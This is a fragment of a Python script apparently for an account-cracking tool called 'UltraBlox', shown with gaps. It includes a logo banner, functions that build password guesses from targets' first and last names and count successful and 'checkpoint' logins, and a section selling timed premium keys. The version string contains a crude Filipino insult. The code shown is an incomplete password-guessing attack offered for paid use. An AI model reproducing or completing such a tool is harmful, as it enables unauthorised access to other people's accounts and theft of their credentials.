...
try:
    os.makedirs('/sdcard/UltraBlox')
except:
    pass
sys.stdout.write('\x1b]2; BLOX\x07')
#<<_________[ LOGO ]_________>>#
logo=(f"""
\033[1;34m
BBBBB   LLLLLL   OOOOO   XX   XX
BB   BB  LL      OO   OO   XX XX
BBBBBB   LL      OO   OO    XXX   
BB   BB  LL      OO   OO   XX XX       
...
\033[1;37m ================================================
 ...
 \033[1;97m[\033[1;92m•\033[1;97m] Version  : sikret tanginamo
\033[1;37m ================================================""")
...
def ffb(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [UltraBlox] %s | M1 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [UltraBlox] %s | M3 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def subscription(message):
    ...
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mNote  \033[1;97m:  \033[1;92mWelcome To UltraBlox Tool")
    line()
    ...
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] 10 For 07 Days")
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] 30 For 15 Days")
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] 80 For 1 Month")
    line()
    ...
    tsk = "Hello UltraBlox Sir ! I Need To Buy Your Premium Tools So Please Approve My Key-:)\n\nName: "+uname+" \nKey: "+key
